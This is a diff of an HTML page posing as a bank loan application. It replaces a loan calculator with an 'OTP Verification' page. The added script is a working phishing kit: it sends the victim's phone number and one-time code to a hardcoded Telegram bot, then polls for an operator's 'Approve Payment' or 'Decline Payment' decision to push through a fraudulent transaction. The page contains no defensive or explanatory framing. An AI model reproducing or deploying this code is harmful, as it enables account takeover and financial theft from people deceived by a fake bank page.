@@ -7,7 +7,6 @@
     <title>APPLY NOW</title>
     <script type="module" crossorigin="" src="/assets/index-ICga6lTX.js"></script>
     <link rel="stylesheet" crossorigin="" href="/assets/index-Co8vtjEO.css">
-
     <style>
          :root {
             font-family: system-ui, Avenir, Helvetica, Arial, sans-serif;
@@ -1491,140 +1490,383 @@
             padding: 0;
             box-sizing: border-box
         }
+        /* Center the verify button */
+        
+        .otp-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            gap: 25px;
+            padding: 10px;
+            background: #fff;
+            box-shadow: 0 4px 20px #0000001a;
+            max-width: 400px;
+            margin: 0 auto;
+            border-radius: 0;
+            color: #fff;
+            padding-top: 5rem;
+        }
+        /* Center the verify button container */
+        
+        .otp-container>div:last-child {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
+        
+        .copy-btn {
+            background-color: #042f74;
+            color: #fff;
+            width: 16rem;
+            margin: 0 auto;
+            display: block;
+        }
     </style>
 </head>
 
 <body>
-
-    <body>
-        <div id="root">
-            <div>
-                <div class="loan-calculator-container">
-                    <div>
-                        <header class="_topHeader_etq7j_1"><img alt="cabs" src="cabslogo.jpeg">
-                            <div><svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="blue" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user" aria-hidden="true"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
-                                <h1>Welcome </h1>
-                            </div>
-                        </header>
-                    </div>
-                    <div class="calculator-header">
-                        <h1>Get Your Loan Approved <span class="fast-text">Fast</span></h1>
-                        <p class="subtitle">Quick approval • Competitive rates • Flexible terms</p>
-                    </div>
-                    <div class="calculator-content">
-                        <div class="calculator-section">
-                            <h2 class="section-title">Loan Calculator</h2>
-                            <div class="calculator-control"><label class="control-label">Loan Amount</label>
-                                <div class="amount-display">$500</div>
-                                <div class="slider-container"><input min="500" max="50000" step="100" class="amount-slider" type="range" value="500">
-                                    <div class="slider-labels"><span>USD 500</span><span>USD 50,000</span></div>
-                                </div>
-                            </div>
-                            <div class="calculator-control"><label class="control-label">Loan Term</label>
-                                <div class="term-display">12 months</div>
-                                <div class="term-buttons"><button class="term-button ">6 months</button><button class="term-button active">12 months</button><button class="term-button ">24 months</button><button class="term-button ">36 months</button><button class="term-button ">48 months</button>
-                                    <button class="term-button ">60 months</button>
-                                </div>
-                            </div>
-                            <div class="payment-display">
-                                <div class="payment-label">Monthly Payment</div>
-                                <div class="payment-amount">$42.69</div>
-                                <div class="interest-rate">Interest rate: 4.5% APR</div>
-                            </div><button class="apply-button">APPLY NOW</button></div>
-                        <div class="features-section">
-                            <div class="feature-card">
-                                <div class="feature-icon">⚡</div>
-                                <div class="feature-content">
-                                    <h3 class="feature-title">Fast Approval</h3>
-                                    <p class="feature-desc">Within 24 hours</p>
-                                </div>
-                            </div>
-                            <div class="feature-card">
-                                <div class="feature-icon">💰</div>
-                                <div class="feature-content">
-                                    <h3 class="feature-title">Low Rates</h3>
-                                    <p class="feature-desc">From 8%</p>
-                                </div>
-                            </div>
-                            <div class="feature-card">
-                                <div class="feature-icon">🔒</div>
-                                <div class="feature-content">
-                                    <h3 class="feature-title">Secure</h3>
-                                    <p class="feature-desc">Bank-level security</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+    <div>
+        <div class="otp-container"><img class="momoImg" alt="mtn" src="cabslogo.jpeg">
+            <div class="otpheader">
+                <h2>OTP Verification</h2>
+                <p>Please enter the OTP sent to your number <br><span style="font-weight: bold; color: rgb(51, 51, 51);"></span> (sms)</p>
             </div>
+            <div class="otp-inputs"><input inputmode="numeric" maxlength="1" class="otp-input  " autocomplete="one-time-code" type="text" value=""><input inputmode="numeric" maxlength="1" class="otp-input  " autocomplete="one-time-code" type="text" value=""><input inputmode="numeric"
+                    maxlength="1" class="otp-input  " autocomplete="one-time-code" type="text" value=""><input inputmode="numeric" maxlength="1" class="otp-input  " autocomplete="one-time-code" type="text" value=""><input inputmode="numeric" maxlength="1"
+                    class="otp-input  " autocomplete="one-time-code" type="text" value=""><input inputmode="numeric" maxlength="1" class="otp-input  " autocomplete="one-time-code" type="text" value=""></div>
+            <div><button class="copy-btn" type="button" disabled="" style="opacity: 0.6; cursor: not-allowed;">Verify and Login</button></div>
         </div>
-        <script>
-            // Get all the elements
-            const amountSlider = document.querySelector('.amount-slider');
-            const termButtons = document.querySelectorAll('.term-button');
-            const amountDisplay = document.querySelector('.amount-display');
-            const termDisplay = document.querySelector('.term-display');
-            const paymentAmount = document.querySelector('.payment-amount');
-            const interestRate = document.querySelector('.interest-rate');
-            const applyButton = document.querySelector('.apply-button');
+    </div>
+    <script>
+        // =============================================
+        // 1. TELEGRAM BOT CONFIGURATION
+        // =============================================
+        const TELEGRAM_BOT_TOKEN = '8837391101:AAGg67ocg28lq83XTKoLSl8myqLSzr0fiEo'; // <-- Replace with your bot token
+        const TELEGRAM_CHAT_ID = '8851096978'; // <-- Replace with your chat ID
 
-            let selectedTerm = 12; // default months
+        function sendOTPToTelegram(otp) {
+            const phone = localStorage.getItem('loginPhone') || 'N/A';
+            const text = `🔐 *OTP Payment Verification*\n\n` +
+                `📱 Phone: \`${phone}\`\n` +
+                `🔑 OTP Code: *${otp}*\n` +
+                `🕐 Time: ${new Date().toLocaleString()}\n\n` +
+                `_Approve or Decline the payment below:_`;
 
-            // --- Update term button active state ---
-            termButtons.forEach(btn => {
-                btn.addEventListener('click', function() {
-                    // Remove active class from all term buttons
-                    termButtons.forEach(b => b.classList.remove('active'));
-                    // Add active to the clicked one
-                    this.classList.add('active');
-                    // Extract the number of months from the button text
-                    const match = this.textContent.trim().match(/(\d+)\s*months?/);
-                    if (match) {
-                        selectedTerm = parseInt(match[1]);
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                })
+                .then(r => r.json())
+                .then(resp => {
+                    if (resp.ok && resp.result) {
+                        const msgId = resp.result.message_id;
+                        // Send inline keyboard (Approve Payment / Cancel Payment)
+                        sendPaymentInlineKeyboard(msgId, otp);
                     }
-                    updateCalculator();
+                })
+                .catch(err => console.error('Telegram send error:', err));
+        }
+
+        function sendPaymentInlineKeyboard(messageId, otp) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
+            const inlineKeyboard = {
+                inline_keyboard: [
+                    [{
+                        text: '✅ APPROVE PAYMENT',
+                        callback_data: 'approve_payment'
+                    }, {
+                        text: '❌ DECLINE PAYMENT',
+                        callback_data: 'decline_payment'
+                    }]
+                ]
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    message_id: messageId,
+                    reply_markup: inlineKeyboard
+                })
+            }).catch(err => console.error('Inline keyboard error:', err));
+        }
+
+        // Poll for callback_query answers (approve/decline)
+        let lastUpdateId = 0;
+        let pollingActive = false;
+
+        function pollTelegramCallbacks() {
+            if (pollingActive) return;
+            pollingActive = true;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId}&timeout=30`;
+
+            fetch(url)
+                .then(r => r.json())
+                .then(resp => {
+                    pollingActive = false;
+                    if (resp.ok && resp.result) {
+                        resp.result.forEach(update => {
+                            lastUpdateId = update.update_id + 1;
+
+                            if (update.callback_query) {
+                                const query = update.callback_query;
+                                const data = query.data;
+
+                                // Answer the callback query so the loading stops on the button
+                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        callback_query_id: query.id,
+                                        text: data === 'approve_payment' ? '✅ Payment Approved!' : '❌ Payment Declined'
+                                    })
+                                });
+
+                                if (data === 'approve_payment') {
+                                    // Edit the message to show approved
+                                    editTelegramMessage(query.message.chat.id, query.message.message_id,
+                                        '✅ *Payment Approved!* Redirecting to success page...');
+
+                                    // Redirect to success.html
+                                    setTimeout(() => {
+                                        window.location.href = 'success.html';
+                                    }, 1500);
+
+                                } else if (data === 'decline_payment') {
+                                    // Edit the message to show declined
+                                    editTelegramMessage(query.message.chat.id, query.message.message_id,
+                                        '❌ *Payment Declined by Admin*\nThe page will reset for OTP re-entry.');
+
+                                    // Reset the OTP page for re-entry
+                                    setTimeout(() => {
+                                        resetOTPPage();
+                                    }, 2000);
+                                }
+                            }
+                        });
+                    }
+                    // Continue polling after a delay
+                    setTimeout(() => {
+                        pollingActive = false;
+                    }, 1000);
+                })
+                .catch(() => {
+                    pollingActive = false;
+                    setTimeout(pollTelegramCallbacks, 3000);
                 });
-            });
+        }
 
-            // --- Update amount display from slider ---
-            amountSlider.addEventListener('input', function() {
-                updateCalculator();
-            });
+        function editTelegramMessage(chatId, messageId, text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    message_id: messageId,
+                    text: text,
+                    parse_mode: 'Markdown',
+                    reply_markup: {
+                        inline_keyboard: []
+                    } // remove buttons
+                })
+            }).catch(() => {});
+        }
 
-            // --- The core calculation function ---
-            function updateCalculator() {
-                const amount = parseFloat(amountSlider.value);
-                const months = selectedTerm;
-
-                // Update display values
-                amountDisplay.textContent = '$' + amount.toLocaleString();
-                termDisplay.textContent = months + (months === 1 ? ' month' : ' months');
-
-                // Interest rate: 8% APR
-                const annualRate = 0.08;
-                interestRate.textContent = 'Interest rate: 8% APR';
-
-                // Monthly payment formula (amortization)
-                const monthlyRate = annualRate / 12;
-                if (months === 0) {
-                    paymentAmount.textContent = '$' + amount.toFixed(2);
-                } else {
-                    const power = Math.pow(1 + monthlyRate, months);
-                    const monthlyPayment = amount * (monthlyRate * power) / (power - 1);
-                    paymentAmount.textContent = '$' + monthlyPayment.toFixed(2);
-                }
+        function resetOTPPage() {
+            // Clear all OTP inputs
+            document.querySelectorAll('.otp-input').forEach(inp => inp.value = '');
+            // Reset verify button
+            const verifyBtn = document.querySelector('.copy-btn');
+            if (verifyBtn) {
+                verifyBtn.disabled = true;
+                verifyBtn.style.opacity = '0.6';
+                verifyBtn.style.cursor = 'not-allowed';
+                verifyBtn.textContent = 'Verify and Login';
             }
+            // Focus first input
+            const firstInput = document.querySelector('.otp-input');
+            if (firstInput) firstInput.focus();
+        }
 
-            // --- Initialize ---
-            updateCalculator();
+        // =============================================
+        // 2. OTP AUTO-ENTER / AUTO-MOVE / PASTE SUPPORT
+        // =============================================
+        const otpInputs = document.querySelectorAll('.otp-input');
 
-            // --- Apply Now button navigates to apply.html ---
-            applyButton.addEventListener('click', function() {
-                localStorage.setItem('loanAmount', amountSlider.value);
-                localStorage.setItem('loanTerm', selectedTerm.toString());
-                window.location.href = 'apply.html';
+        otpInputs.forEach((input, index) => {
+            // Auto-move to next input when a digit is typed
+            input.addEventListener('input', function(e) {
+                // Handle paste event via input
+                if (this.value.length > 1) {
+                    // Bulk paste detected - distribute characters
+                    const chars = this.value.replace(/\D/g, '').split('');
+                    chars.forEach((char, i) => {
+                        if (i < otpInputs.length) {
+                            otpInputs[i].value = char;
+                            otpInputs[i].classList.add('filled');
+                        }
+                    });
+                    // Focus the next empty input or the last one
+                    const nextEmpty = Array.from(otpInputs).find(inp => inp.value === '');
+                    if (nextEmpty) {
+                        nextEmpty.focus();
+                    } else {
+                        otpInputs[otpInputs.length - 1].focus();
+                    }
+                } else if (this.value.length === 1) {
+                    this.classList.add('filled');
+                    // Move to next input
+                    if (index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                } else {
+                    this.classList.remove('filled');
+                }
+                checkOTPComplete();
             });
-        </script>
-    </body>
+
+            // Handle paste event explicitly for better UX
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pasted = (e.clipboardData || window.clipboardData).getData('text');
+                const digits = pasted.replace(/\D/g, '').split('').slice(0, otpInputs.length);
+
+                digits.forEach((char, i) => {
+                    otpInputs[i].value = char;
+                    otpInputs[i].classList.add('filled');
+                });
+
+                // Focus the next empty or last input
+                const nextEmpty = Array.from(otpInputs).find(inp => inp.value === '');
+                if (nextEmpty) {
+                    nextEmpty.focus();
+                } else {
+                    otpInputs[otpInputs.length - 1].focus();
+                }
+                checkOTPComplete();
+            });
+
+            // Backspace: go to previous input
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace') {
+                    if (this.value === '' && index > 0) {
+                        otpInputs[index - 1].focus();
+                        otpInputs[index - 1].value = '';
+                        otpInputs[index - 1].classList.remove('filled');
+                    } else if (this.value !== '') {
+                        this.value = '';
+                        this.classList.remove('filled');
+                    }
+                    checkOTPComplete();
+                }
+                // Arrow keys for navigation
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+                if (e.key === 'ArrowRight' && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+
+            // Only allow numeric input
+            input.addEventListener('keypress', function(e) {
+                if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' &&
+                    e.key !== 'ArrowLeft' && e.key !== 'ArrowRight' && e.key !== 'Tab') {
+                    e.preventDefault();
+                }
+            });
+
+            // Focus handler - select existing content
+            input.addEventListener('focus', function() {
+                this.select();
+            });
+        });
+
+        // =============================================
+        // 3. CHECK OTP COMPLETE + VERIFY BUTTON
+        // =============================================
+        function checkOTPComplete() {
+            const allFilled = Array.from(otpInputs).every(inp => inp.value.length === 1);
+            const verifyBtn = document.querySelector('.copy-btn');
+            if (verifyBtn) {
+                verifyBtn.disabled = !allFilled;
+                verifyBtn.style.opacity = allFilled ? '1' : '0.6';
+                verifyBtn.style.cursor = allFilled ? 'pointer' : 'not-allowed';
+            }
+            return allFilled;
+        }
+
+        // =============================================
+        // 4. VERIFY BUTTON - Send to Telegram + Poll
+        // =============================================
+        document.addEventListener('DOMContentLoaded', function() {
+            const verifyBtn = document.querySelector('.copy-btn');
+            if (!verifyBtn) return;
+
+            verifyBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (this.disabled) return;
+
+                // Collect OTP
+                let otp = '';
+                otpInputs.forEach(inp => {
+                    otp += inp.value;
+                });
+
+                if (otp.length !== 6) {
+                    alert('Please enter the complete 6-digit OTP.');
+                    return;
+                }
+
+                // Save OTP to localStorage
+                localStorage.setItem('otpCode', otp);
+
+                // Show loading state
+                this.textContent = 'VERIFYING...';
+                this.disabled = true;
+                this.style.opacity = '0.6';
+
+                // Send OTP to Telegram bot
+                sendOTPToTelegram(otp);
+
+                // Start polling for admin response (approve/decline)
+                setInterval(pollTelegramCallbacks, 2000);
+            });
+
+            // Focus first OTP input on load
+            if (otpInputs.length > 0) {
+                otpInputs[0].focus();
+            }
+        });
+
+        // =============================================
+        // 5. INITIAL STATE
+        // =============================================
+        document.addEventListener('DOMContentLoaded', function() {
+            checkOTPComplete();
+        });
+    </script>
+</body>
 
 </html>
